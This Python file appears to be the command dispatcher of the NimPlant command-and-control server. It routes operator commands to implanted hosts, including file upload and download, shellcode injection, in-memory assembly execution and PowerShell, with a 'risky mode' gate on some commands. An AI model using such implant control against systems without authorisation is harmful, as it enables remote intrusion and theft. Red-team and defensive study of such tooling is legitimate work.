import shlex
import yaml
import json
from yaml.loader import FullLoader
import src.util.time as time
import src.servers.admin_api.commands.commands as commands
import src.servers.admin_api.models.nimplant_listener_model as listener
from src.servers.admin_api.models.nimplant_client_model import NimPlant
import src.config.db as db


import src.util.utils as utils


def get_commands():
    with open("src/servers/admin_api/commands/commands.yaml", "r", encoding="UTF-8") as f:
        return sorted(yaml.load(f, Loader=FullLoader), key=lambda c: c["command"])


def get_command_list():
    return [c["command"] for c in get_commands()]


def get_risky_command_list():
    return [c["command"] for c in get_commands() if c["risky_command"]]


def handle_command(raw_command, np: NimPlant = None):
    from src.servers.admin_api.admin_server_init import np_server
    if np is None:
        np = listener.np_server.get_active_nimplant()
    
    # If np is still None, it means that no active implant is selected
    if np is None:
        # Handle commands that don't require an active implant
        cmd = raw_command.lower().split(" ")[0]
        args = shlex.split(raw_command.replace("\\", "\\\\"))[1:]
        
        # Global commands that work without an active implant
        if cmd == "":
            return
        elif cmd == "clear":
            commands.cls()
            return
        elif cmd == "help":
            msg = commands.get_help_menu()
            utils.nimplant_print(msg)
            return
        elif cmd == "list":
            msg = np_server.get_nimplant_info()
            utils.nimplant_print(msg)
            return
        elif cmd == "listall":
            msg = np_server.get_nimplant_info(include_all=True)
            utils.nimplant_print(msg)
            return
        elif cmd == "select":
            if len(args) == 1:
                np_server.select_nimplant(args[0])
            else:
                utils.nimplant_print("Invalid argument length. Usage: 'select [Implant ID]'.")
            return
        elif cmd == "exit":
            commands.exit_server_console()
            return
        else:
            utils.nimplant_print("No active implant selected. Use 'select [ID]' to select an implant, or 'list' to see all implants.")
            return

    # If we get here, there is an active implant selected
    utils.log(f"Implant {np.id} $ > {raw_command}", np.guid)

    try:
        cmd = raw_command.lower().split(" ")[0]
        args = shlex.split(raw_command.replace("\\", "\\\\"))[1:]
        nimplant_cmds = [cmd.lower() for cmd in get_command_list()]

        # Handle commands
        if cmd == "":
            pass

        elif cmd in get_risky_command_list() and not np.risky_mode:
            msg = (
                f"Uh oh, you compiled this Implant in safe mode and '{cmd}' is considered to be a risky command.\n"
                "Please enable 'riskyMode' in 'config.toml' and re-compile Implant!"
            )
            utils.nimplant_print(msg, np.guid, raw_command)

        elif cmd == "cancel":
            np.cancel_all_tasks()
            utils.nimplant_print(
                f"All tasks cancelled for implant {np.id}.", np.guid, raw_command
            )

        elif cmd == "clear":
            commands.cls()

        elif cmd == "getpid":
            msg = f"Implant PID is {np.pid}"
            utils.nimplant_print(msg, np.guid, raw_command)

        elif cmd == "getprocname":
            msg = f"Implant is running inside of {np.pname}"
            utils.nimplant_print(msg, np.guid, raw_command)

        elif cmd == "help":
            try:
                utils.nimplant_print(f"DEBUG: Processing help command with {len(args)} arguments", np.guid)
                
                if len(args) >= 1:
                    msg = commands.get_command_help(args[0])
                else:
                    msg = commands.get_help_menu()
                
                # Ensure the message is a string
                if msg is None:
                    msg = "No help content available."
                
                utils.nimplant_print(f"DEBUG: Help message length: {len(str(msg))}", np.guid)
                
                # Register the help message in the history using the standard function
                utils.nimplant_print(msg, np.guid, raw_command)
                
                # Insert directly into the history collection (alternative method)
                # This ensures the help command and its response are saved correctly
                try:
                    # Format for the history entry
                    entry = {
                        "nimplantGuid": np.guid,
                        "task": raw_command,
                        "taskFriendly": raw_command,
                        "taskTime": time.timestamp(),
                        "result": msg,
                        "resultTime": time.timestamp()
                    }
                    
                    # Insert into the database
                    db.db_nimplant_log(np, task_guid=None, task=raw_command, task_friendly=raw_command, result=msg)
                    utils.nimplant_print(f"DEBUG: Explicit insertion into history completed", np.guid)
                except Exception as db_error:
                    utils.nimplant_print(f"ERROR in direct DB insertion: {str(db_error)}", np.guid)
                
                # Verify that it has been registered correctly
                utils.nimplant_print(f"DEBUG: Help message registered for nimplant {np.guid}", np.guid)
            except Exception as e:
                utils.nimplant_print(f"ERROR in help command: {str(e)}", np.guid, raw_command)
                import traceback
                utils.nimplant_print(traceback.format_exc(), np.guid)
                
        elif cmd == "hostname":
            msg = f"Implant hostname is: {np.hostname}"
            utils.nimplant_print(msg, np.guid, raw_command)

        elif cmd == "ipconfig":
            msg = f"Implant external IP address is: {np.ip_external}\n"
            msg += f"Implant internal IP address is: {np.ip_internal}"
            utils.nimplant_print(msg, np.guid, raw_command)

        elif cmd == "list":
            msg = np_server.get_nimplant_info()
            utils.nimplant_print(msg, np.guid, raw_command)

        elif cmd == "listall":
            msg = np_server.get_nimplant_info(include_all=True)
            utils.nimplant_print(msg, np.guid, raw_command)

        elif cmd == "nimplant":
            msg = np.get_info_pretty()
            utils.nimplant_print(msg, np.guid, raw_command)

        elif cmd == "osbuild":
            msg = f"Implant OS build is: {np.os_build}"
            utils.nimplant_print(msg, np.guid, raw_command)

        elif cmd == "select":
            if len(args) == 1:
                np_server.select_nimplant(args[0])
            else:
                utils.nimplant_print(
                    "Invalid argument length. Usage: 'select [Implant ID]'.",
                    np.guid,
                    raw_command,
                )

        elif cmd == "exit":
            commands.exit_server_console()

        elif cmd == "upload":
            commands.upload_file(np, args, raw_command)

        elif cmd == "download":
            commands.download_file(np, args, raw_command)

        elif cmd == "execute-assembly":
            commands.execute_assembly(np, args, raw_command)

        elif cmd == "inline-execute":
            commands.inline_execute(np, args, raw_command)

        elif cmd == "shinject":
            commands.shinject(np, args, raw_command)

        elif cmd == "powershell":
            commands.powershell(np, args, raw_command)

        # Handle commands that do not need any server-side handling
        elif cmd in nimplant_cmds:
            guid = np.add_task(list([cmd, *args]), task_friendly=raw_command)
            utils.nimplant_print(
                f"Staged command '{raw_command}'.", np.guid, task_guid=guid
            )
        else:
            utils.nimplant_print(
                "Unknown command. Enter 'help' to get a list of commands.",
                np.guid,
                raw_command,
            )

    except Exception as e:
        utils.nimplant_print(
            f"An unexpected exception occurred when handling command: {repr(e)}",
            np.guid,
            raw_command,
        )
